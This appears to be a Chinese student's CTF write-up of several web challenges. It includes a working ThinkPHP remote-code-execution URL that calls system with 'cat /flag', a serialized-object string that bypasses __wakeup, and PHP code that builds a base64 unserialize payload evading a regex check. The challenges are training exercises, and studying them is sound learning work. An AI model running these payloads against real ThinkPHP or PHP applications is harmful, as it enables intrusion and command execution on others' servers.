#baby_web
题目一开始提示找初始网页，就想到了index.php，但是发现没有动静。Dirsearch扫目录发现index.php也被指向了1.php，感觉不知道应该怎么下手。看了writeup是burp抓跳转至index.php时的包，再查看response得到flag。

#Training-www-robots
既然提到了robots，那就扫一下目录，发现robots.txt可以访问。访问robots.txt,内有fl0g.php,再访问得到flag。

#php_rce
看标题感觉和php有关，一打开链接就看见超大的thinkphp，于是就查了一下thinkphp有getshell漏洞，想了半天不会构造payload，贴个大佬的payload:http://111.198.29.45:45747/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cat%20/flag 得到flag

#unserialize3
组长以前发过反序列化和魔术方法的资料，这次结合题目能解决一部分疑惑。  
知识点：  
1、serialize()函数：用于序列化对象或数组，并返回一个字符串。序列化对象后，可以很方便的将它传递给其他需要它的地方，且其类型和结构不会改变。  
2、unserialize()函数：用于将通过serialize()函数序列化后的对象或数组进行反序列化，并返回原始的对象结构。  
3、serialize()和unserialize()函数对魔术方法的处理：serialize()函数会检查类中是否存在一个魔术方法__sleep()。如果存在，该方法会先被调用，然后才执行序列化操作，此功能可以用于清理对象。  
unserialize()函数会检查类中是否存在一个魔术方法__wakeup()，如果存在，则会先调用 __wakeup 方法，预先准备对象需要的资源。
4、__wakeup()执行漏洞：一个字符串或对象被序列化后，如果其属性被修改，则不会执行__wakeup()函数，这也是一个绕过点。  
正常序列化后得到结果：O:4:"xctf":1:{s:4:"flag";s:3:"111";}  
大括号前面的1便是属性变量的个数，只需对其进行更改便可以绕过__wakeup()，使exit函数不被执行。  
传参?code=O:4:"xctf":2:{s:4:"flag";s:3:"111";}

#Web_php_unserialize
题目中先base64解码，再判断是否绕过了preg_match（）和_wakeup（），所以先对序列化的内容进行修改，再对修改过的内容进行base64加密。可惜的是思路是跟得上，代码能力跟不上，而且php试错好麻烦啊。  
这里是大佬的代码：$A = new Demo('fl4g.php');//新建类  
    $C = serialize($A);//对A进行序列化  
    //string(49) "O:4:"Demo":1:{s:10:"Demofile";s:8:"fl4g.php";}"  
$C = str_replace('O:4', 'O:+4',$C);//绕过preg_match，跳过正则匹配  
    $C = str_replace(':1:', ':2:',$C);//绕过wakeup，写入变量数大于实际变量数  
    var_dump($C);  
    //string(49) "O:+4:"Demo":2:{s:10:"Demofile";s:8:"fl4g.php";}"  
    var_dump(base64_encode($C));  
    //string(68) "TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ=="  
?>  
一定要好好学语言（flag）

#NaNNaNNaNNaN…, Batman!
拿到没有后缀的文件加上txt，看到了一顿乱码和eval就想试试菜刀，发现完全不对劲。再仔细看看txt之后，发现有正则表达式的影子，^匹配开头 $匹配结尾，这道题就差不多就能蒙出来。
之后查看Write up，得知用alert（_）可弹出_函数的内容进行代码审计 解题更严谨。